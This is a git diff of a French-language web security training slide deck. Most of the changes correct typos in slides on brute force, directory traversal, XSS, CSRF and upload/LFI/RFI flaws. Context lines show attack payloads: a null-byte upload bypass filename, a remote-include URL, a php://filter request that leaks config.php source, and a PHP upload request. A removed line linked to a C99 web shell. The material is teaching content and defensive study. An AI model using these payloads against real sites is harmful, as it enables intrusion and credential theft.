@@ -57,7 +57,7 @@
 					</section>
 					<section>
 						<h2>Définition</h2>
-						<p>Les principes de la sécurité des application sont l'ensemble des propriétés, des comportements, des conceptions et des pratiques de mise en œuvre qui visent à réduire la probabilité du succès d'une attaque et l'impact de celle-ci . Les principes de sécurité sont indépendants du language et de l'architecture, et peuvent être utilisés dans la plupart des méthodologies de développement de logiciels pour concevoir et construire des applications sécurisées.</p>
+						<p>Les principes de la sécurité des applications sont l'ensemble des propriétés, des comportements, des conceptions et des pratiques de mise en œuvre qui visent à réduire la probabilité du succès d'une attaque et l'impact de celle-ci . Les principes de sécurité sont indépendants du language et de l'architecture, et peuvent être utilisés dans la plupart des méthodologies de développement de logiciels pour concevoir et construire des applications sécurisées.</p>
 						<a target="_blank" href="https://www.owasp.org/index.php/Category:Principle">owasp</a>
 					</section>
 					<section>
@@ -68,7 +68,7 @@
                             <li class="fragment">Minimiser l'impact des erreurs</li>
                             <li class="fragment">Exécuter avec le minimum de droit</li>
                             <li class="fragment">Garder un système de sécurité le plus simple possible</li>
-                            <li class="fragment">Détecter les intrusion (mettre suffisament de logs)</li>
+                            <li class="fragment">Détecter les intrusions (mettre suffisament de logs)</li>
                             <li class="fragment">Ne jamais faire confiance à l'infrastructure</li>
                             <li class="fragment">Ne pas faire confiance aux utilisateurs</li>
                         </ol>
@@ -95,9 +95,9 @@
     							<li>
     								Identification des URLs des CMS
     								<ul>
-    									<li>Drupal /user ou ?q=user</li>
-    									<li>Ezpublish /administration</li>
-    									<li>Wordpress /wp-admin</li>
+    									<li>Drupal : /user ou ?q=user</li>
+    									<li>Ezpublish : /administration</li>
+    									<li>Wordpress : /wp-admin</li>
     								</ul>					
     							</li>
     							<li>
@@ -141,8 +141,8 @@
 				<section>
 					<h2>Les attaques</h2>
                     <ol>
-                        <li>Brute force</li>
-                        <li><em>Taversal directory</em></li>
+                        <li><em>Brute force</em></li>
+                        <li><em>Traversal directory</em></li>
                         <li>Authentification HTTP</li>
                         <li >Injections
                             <ul>
@@ -166,7 +166,7 @@
 					</section>
 					<section>
 						<h2>Brute force - Exemple</h2>
-						<p>Voici un simple code generant des mot de passe et les testant sur l'acces à l'administration d'un site vulnérable.</p>
+						<p>Voici un simple code générant des mots de passe et les testant sur l'accès à l'administration d'un site vulnérable.</p>
 						<pre><code data-trim contenteditable class='ruby' ><![CDATA[
 @agent = Mechanize.new
 
@@ -204,7 +204,7 @@ end]]></code></pre>
                             <li>Utilisation de mots de passe robustes</li>
                             <li>Génération aléatoire des mots de passe</li>
                             <li>Eviter de donner trop d'informations dans les messages d'erreur</li>
-                            <li>Augmenter le temps à chaque tentative (timeur, captcha, etc..)</li>
+                            <li>Augmenter le temps à chaque tentative (<em>timer</em>, <em>captcha</em>, etc..)</li>
                             <li>Limiter le nombre de tentatives possibles</li>
                             <li>Renouveller les mots de passes</li>
                         </ul>
@@ -240,7 +240,7 @@ http://exemple.com/upload
 						<h2><em>Traversal directory</em> - Solution</h2>
 
                         <ul>
-                            <li>Ajouter un index.php/.html dans les répertoire</li>
+                            <li>Ajouter un index.php/.html dans les répertoires</li>
                             <li>
                                 Protéger avec un .htaccess
                                 <ul>
@@ -254,7 +254,7 @@ http://exemple.com/upload
 					<section>
 						<h2>Authentification HTTP</h2>
 						<p>
-							Le protocole HTTP fournit un moyen de gérer une authentification et de restreindre l'accès à une ressources.
+							Le protocole HTTP fournit un moyen de gérer une authentification et de restreindre l'accès à une ressource.
 							Il existe deux méthodes pour gérer cette authentification :
                         </p>
                         <ul>
@@ -287,7 +287,7 @@ http://exemple.com/upload
 							Les verbes HTTP sont les méthodes utilisées pour indiquer l'action desirée.
                         </p>
                         <ul>
-                            <li><strong>GET</strong> : Demande d'une ressources comme une page web en fonction d'une URL</li>
+                            <li><strong>GET</strong> : Demande d'une ressource comme une page web en fonction d'une URL</li>
                             <li><strong>POST</strong> : Demande d'une ressource avec des données encapsulées dans la requête</li>
                             <li><strong>PUT</strong> : Demande d'enregistrement de données encapsulées dans la requête</li>
                             <li><strong>DELETE</strong> : Demande de suppression d'une ressource sur le serveur</li>
@@ -296,7 +296,7 @@ http://exemple.com/upload
                         <aside class="notes">
                             <p>Liste exhaustive des verbes :</p>
 							<ul>
-                                <li><strong>GET</strong> : Demande d'une ressources comme une page web en fonction d'une URL</li>
+                                <li><strong>GET</strong> : Demande d'une ressource comme une page web en fonction d'une URL</li>
                                 <li><strong>POST</strong> : Demande d'une ressource avec des données encapsulées dans la requête</li>
                                 <li><strong>PUT</strong> : Demande d'enregistrement de données encapsulées dans la requête</li>
                                 <li><strong>DELETE</strong> : Demande de suppression d'une ressource sur le serveur</li>
@@ -504,7 +504,7 @@ if($logged){
 						<h2>Injection PHP</h2>
 						
 						<p>
-							Certains sites permettent aux utilisateurs de contribuer directement du code PHP. (ex: Drupal)
+							Certains sites permettent aux utilisateurs de contribuer directement du code PHP (ex: Drupal).
                         </p>
  						<pre><code data-trim class="php">
 set_time_limit(0);
@@ -540,7 +540,7 @@ while($continuer)
 					<section>
 						<h2>XSS - <em>Cross Site Scripting</em></h2>
 						<p>
-							XSS où « <em>Cross-Site Scripting</em> » est l’une des failles les plus répandues dans les sites Web dynamiques. Elle fait partie de la famille des attaques par injection.
+							XSS ou « <em>Cross-Site Scripting</em> » est l’une des failles les plus répandues dans les sites Web dynamiques. Elle fait partie de la famille des attaques par injection.
 						</p>
 						<p>
 							Le but de cette attaque est d’effectuer un certain nombre d’actions dans le navigateur de la victime.
@@ -611,15 +611,15 @@ while($continuer)
 					<section>
 						<h2>Injection CSRF - Solutions</h2>
 						<p>
-							Utilisation de token CSRF pour éviter que des requête puisssent être rejouées.
+							Utilisation de token CSRF pour éviter que des requêtes puisssent être rejouées.
 						</p>
 					</section>
 				</section>
 
 				<section>
-					<h2>Les faille Upload/LFI/RFI</h2>
+					<h2>Les failles Upload/LFI/RFI</h2>
 					<p>
-						Ces failles sont dûes à des failles dans les script d'upload ou dans l'inclusion de fichiers sans contrôle dans une page.
+						Ces failles sont dûes à des failles dans les scripts d'upload ou dans l'inclusion de fichiers sans contrôle dans une page.
 					</p>
 				</section>
 
@@ -627,7 +627,7 @@ while($continuer)
 					<section>
 						<h2>Faille <em>upload</em></h2>
 						<p>
-							La faille <em>upload</em> permet a un attaquant d'uploader un fichier sur le serveur qui va contenir du code malveillant.
+							La faille <em>upload</em> permet à un attaquant d'uploader un fichier sur le serveur qui va contenir du code malveillant.
 
 							L'objectif est de corrompre le serveur grâce à des <em>trojan</em>, <em>worm</em>, et autre <em>malware</em>.
 						</p>
@@ -656,7 +656,7 @@ if ( in_array($extension_upload,$extensions_valides) ) echo "Extension correcte"
 						</code></pre>
                         <p>
 							Ici, on vérifie l'extension du fichier uploadé. <br /><br />
-							Les <em>Null bytes</em> sont des caractères avec la valeur zéro qui en principe marque la fin d'une chaine de caractères. Si un attaquant voulait uploader quand même un fichier PHP, il lui suffirait de renommer son fichier :
+							Les <em>Null bytes</em> sont des caractères avec la valeur zéro qui en principe marquent la fin d'une chaine de caractères. Si un attaquant voulait uploader quand même un fichier PHP, il lui suffirait de renommer son fichier :
                         </p>
 						<pre><code>c99.php%00.png</code></pre>
 
@@ -685,7 +685,7 @@ Content-Type: image/jpeg\r\n\r\n<?php\necho 'powned';\n?>\r\n
 						<ul>
                             <li>Ne jamais se fier à ce que peut envoyer le client.</li>
                             <li>Vérifier la configuration d’Apache afin d’agir en conséquence.</li>
-                            <li>Ne pas placer le .htaccess dans le répertoire d’upload</li>
+                            <li>Ne pas placer un .htaccess (écrasable) dans le répertoire d’upload</li>
                             <li>Ne pas permettre l’écrasement de fichier</li>
                             <li>Générer un nom aléatoire pour le fichier uploadé et enregistrer le nom dans une base de données.</li>
                             <li>Ne pas permettre de voir l’index du répertoire d’upload.</li>
@@ -704,7 +704,7 @@ Content-Type: image/jpeg\r\n\r\n<?php\necho 'powned';\n?>\r\n
 					<section>
 						<h2>Faille LFI/RFI</h2>
 						<p>
-							Les failles LFI/RFI viennent d'un appel à la fonction PHP <code class="php">include</code>, non sécurisée, qui permet d'inclure soit à des fichiers locaux (LFI - <em>Local File Include</em>), ou d'injecter un script PHP distant (RFI - <em>Remote File Include</em>)
+							Les failles LFI/RFI viennent d'un appel à la fonction PHP <code class="php">include</code>, non sécurisée, qui permet d'inclure soit à des fichiers locaux (LFI - <em>Local File Include</em>), soit d'injecter un script PHP distant (RFI - <em>Remote File Include</em>)
 						</p>
 					</section>
 
@@ -720,7 +720,7 @@ include($incfile.".php");</code></pre>
 						<pre><code>http://vulnerable/?file=http://c99.php%00</code></pre>
 						<p>Appel avec des filters pour récupérer les sources du fichier config.php : </p>						
 						<pre><code>http://vulnerable/?file=php://filter/read=convert.base64-encode/resource=config.php</code></pre>
-						<p>Un exemple de fichier php qui peut créer des dégats : <a target="_blank" href="images/c99.php">C99</a></p>	
+						<p>Un exemple de fichier php qui peut créer des dégats : C99</p>
 					</section>
 					<section>
 						<h2>LFI - Challenge</h2>
